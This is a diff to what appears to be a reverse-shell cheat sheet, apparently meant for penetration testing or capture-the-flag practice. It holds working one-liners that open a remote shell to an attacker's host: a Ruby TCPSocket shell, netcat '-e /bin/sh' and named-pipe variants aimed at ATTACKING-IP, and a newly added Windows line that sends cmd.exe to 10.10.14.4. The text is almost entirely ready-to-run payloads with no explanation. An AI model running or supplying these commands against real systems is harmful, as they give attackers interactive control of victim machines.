@@ -118,7 +118,7 @@ ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh-
 
 
 ## **Netcat**
-
+### Linux
 ```sql
 nc -e /bin/sh ATTACKING-IP 80
 ```
@@ -129,6 +129,10 @@ nc -e /bin/sh ATTACKING-IP 80
 
 ```sql
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
+```
+### Windows
+```sql
+nc.exe -e cmd.exe 10.10.14.4 444
 ```
 
 ## **PowerShell**
